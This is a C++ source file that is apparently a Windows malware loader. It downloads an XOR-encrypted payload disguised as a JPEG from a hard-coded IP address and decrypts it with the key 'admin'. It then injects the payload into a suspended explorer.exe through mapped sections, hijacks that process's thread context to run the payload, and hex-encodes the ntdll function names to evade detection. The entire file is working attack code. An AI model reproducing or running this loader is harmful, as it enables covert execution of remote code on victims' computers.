#include <Windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include "Native.h"
#include <string>
#pragma comment(lib, "winhttp.lib")


std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);                                     // no SSL flag for HTTP

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTP_PORT,              // port 80 for HTTP
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);                                     // no SSL flag for HTTP

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
    std::vector<BYTE> DecryptXOR(const std::vector<BYTE>& data, const std::string& key) {std::vector<BYTE> decryptedData(data.size());const int keyLength = key.length();
    for (size_t i = 0; i < data.size(); ++i) {decryptedData[i] = data[i] ^ key[i % keyLength];} return decryptedData;
}
int main() {
  
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;
  
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
     
    wchar_t cmd[] = L"explorer.exe\0";

    // create process
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    
    std::wstring baseAddress = L"192.168.160.167";
    std::wstring filename = L"/4.jpg";
    std::vector<BYTE> encryptedData = Download(baseAddress.c_str(), filename.c_str());  
    std::string key = "admin";
    std::vector<BYTE> decryptedData = DecryptXOR(encryptedData, key);

  
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    //std::string functionNamec = "Nt" + std::string("Create") + "Section";
    //NtCreateSection ntCreateSection = reinterpret_cast<NtCreateSection>(GetProcAddress(hNtdll, functionNamec.c_str()));

    //std::string functionNamem = "Nt" + std::string("MapView") + "OfSection";
    //NtMapViewOfSection ntMapViewOfSection = reinterpret_cast<NtMapViewOfSection>(GetProcAddress(hNtdll, functionNamem.c_str()));

    //std::string functionNameu = "Nt" + std::string("UnmapView") + "OfSection";
    //NtUnmapViewOfSection ntUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection>(GetProcAddress(hNtdll, functionNameu.c_str()));

    
    //segunda evolicion

    std::string functionNamec = std::string("\x4E\x74") + std::string("\x43\x72") + std::string("\x65\x61") + std::string("\x74\x65") + std::string("\x53\x65") + std::string("\x63\x74") + std::string("\x69\x6F") + std::string("\x6E");
    NtCreateSection ntCreateSection = reinterpret_cast<NtCreateSection>(GetProcAddress(hNtdll, functionNamec.c_str()));

     std::string functionNamem = std::string("\x4E\x74") + std::string("\x4D\x61") + std::string("\x70\x56") + std::string("\x69\x65") + std::string("\x77\x4F") + std::string("\x66\x53") + std::string("\x65\x63") + std::string("\x74\x69") + std::string("\x6F\x6E");
    NtMapViewOfSection ntMapViewOfSection = reinterpret_cast<NtMapViewOfSection>(GetProcAddress(hNtdll, functionNamem.c_str()));

    std::string functionNameu = std::string("\x4E\x74") + std::string("\x55\x6E") + std::string("\x6D\x61") + std::string("\x70\x56") + std::string("\x69\x65") + std::string("\x77\x4F") + std::string("\x66\x53") + std::string("\x65\x63") + std::string("\x74\x69") + std::string("\x6F\x6E");
    NtUnmapViewOfSection ntUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection>(GetProcAddress(hNtdll, functionNameu.c_str()));

                    
    
    HANDLE hSection;
    LARGE_INTEGER szSection = { decryptedData.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

   
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

 
    RtlCopyMemory(hLocalAddress, &decryptedData[0], decryptedData.size());

   
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);
 

    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

 
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // resume thread
    ResumeThread(process_info->hThread);

  
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);

}
